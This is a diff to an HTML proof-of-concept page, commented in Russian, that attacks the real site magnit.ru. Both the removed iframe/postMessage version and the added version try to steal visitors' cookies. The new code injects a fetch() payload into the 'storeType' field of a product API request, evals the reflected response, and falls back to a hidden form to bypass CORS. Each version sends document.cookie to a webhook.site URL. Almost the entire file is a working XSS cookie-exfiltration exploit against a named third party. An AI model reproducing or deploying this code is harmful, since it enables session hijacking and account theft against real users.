@@ -1,46 +1,72 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>Magnit XSS PoC</title>
 </head>
 <body>
-    <p>Please wait, loading...</p>
-    
-    <iframe id="target" src="https://magnit.ru/profile/favorites" style="width:1px;height:1px;border:none;"></iframe>
+    <h1>Loading...</h1>
+    <p>Please wait while the exploit is loading...</p>
     
     <script>
-        // Обработчик сообщений от iframe
-        window.addEventListener('message', function(event) {
-            if (event.origin === 'https://magnit.ru') {
-                console.log('✅ Получено сообщение от magnit.ru:', event.data);
-                // Отправляем cookies на webhook
-                if (event.data && event.data.cookies) {
-                    fetch('https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b', {
-                        method: 'POST',
-                        body: event.data.cookies
-                    });
-                }
-            }
-        });
-        
-        // Внедряем скрипт в iframe
-        document.getElementById('target').onload = function() {
-            console.log('✅ iframe загружен');
+        (function() {
+            console.log('🚀 Запуск XSS-эксплойта для magnit.ru');
             
-            try {
-                var iframeWindow = document.getElementById('target').contentWindow;
+            // Отправляем XSS-запрос напрямую
+            fetch('https://magnit.ru/webgate/v2/goods/get', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    "storeType": "-fetch('https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b', {method:'POST', body:document.cookie})-",
+                    "pagination": {"offset": 0, "limit": 9},
+                    "catalogType": "3",
+                    "storeCode": "250968"
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ Ответ сервера:', data);
+                // Проверяем, отразился ли payload
+                if (data.message && data.message.includes('fetch')) {
+                    console.log('🔥 XSS-пейлоад отражен в ответе!');
+                    // Здесь можно попытаться выполнить код
+                    try {
+                        eval(data.message.match(/-(.*?)-/)[1]);
+                    } catch(e) {
+                        console.log('❌ Ошибка выполнения:', e.message);
+                    }
+                }
+            })
+            .catch(error => {
+                console.log('❌ Ошибка:', error.message);
+                // Если fetch заблокирован CORS, пробуем через form
+                sendViaForm();
+            });
+            
+            // Альтернативный способ: отправка через форму (обходит CORS)
+            function sendViaForm() {
+                console.log('🔄 Пробуем отправить через форму...');
+                var form = document.createElement('form');
+                form.method = 'POST';
+                form.action = 'https://magnit.ru/webgate/v2/goods/get';
+                form.enctype = 'text/plain';
+                form.style.cssText = 'display:none;';
                 
-                // Отправляем сообщение в iframe
-                iframeWindow.postMessage({
-                    type: 'getCookies',
-                    payload: 'fetch("https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b", {method:"POST", body:document.cookie})'
-                }, 'https://magnit.ru');
-                
-                console.log('✅ postMessage отправлен');
-            } catch(e) {
-                console.log('❌ Ошибка postMessage:', e.message);
+                var input = document.createElement('input');
+                input.name = JSON.stringify({
+                    "storeType": "-fetch('https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b', {method:'POST', body:document.cookie})-",
+                    "pagination": {"offset": 0, "limit": 9},
+                    "catalogType": "3",
+                    "storeCode": "250968"
+                });
+                input.value = '';
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
             }
-        };
+        })();
     </script>
 </body>
 </html>
